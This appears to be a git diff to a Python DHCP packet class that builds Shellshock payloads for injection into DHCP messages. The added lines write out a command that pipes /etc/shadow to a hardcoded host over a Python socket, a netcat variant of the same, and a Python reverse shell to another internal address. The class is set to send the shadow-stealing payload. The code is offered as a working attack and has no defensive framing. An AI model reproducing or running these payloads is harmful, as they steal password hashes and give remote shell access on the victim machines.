@@ -87,7 +87,25 @@ class DhcpPacket:
     Parse the message finding the difrent options and values of the dhcp packet
      '''
     def __init__(self, dhcp_message):
-        self.exploit = b"() { :;};/bin/cat/ /etc/shadow | nc -u 192.168.0.23 67"  # % (self.ip, self.port)
+        derp = "python -c " \
+               "'import socket, sys;" \
+               "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);" \
+               "s.connect((\"192.168.0.23\",\"67\"));" \
+               "s.send(sys.stdin.read())'"
+
+        # send the shadow file of computer using python script
+        self.get_shadow_python = b'() { :;};/bin/cat /etc/shadow | python -c "import socket, os, sys;shadow = sys.stdin.read().encode();s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.sendto(shadow, (\'192.168.110.101\', 100))'
+
+        # Reverse shell
+        self.reverse_shell = b"() { :;};python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.110.23\",100));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);"
+
+        # Send shadow file of computer using netcat
+        self.get_shadow_nc = b"() { :;};/bin/cat/ /etc/shadow | nc -u 192.168.0.23 67"  # % (self.ip, self.port)
+
+        # listen to the keyboard
+
+
+        self.exploit = self.get_shadow_python
         self.exploit = [bytes(chr(x).encode('ascii')) for x in self.exploit]
         self.exploit_len = (len(self.exploit)).to_bytes(1, byteorder='big')
 
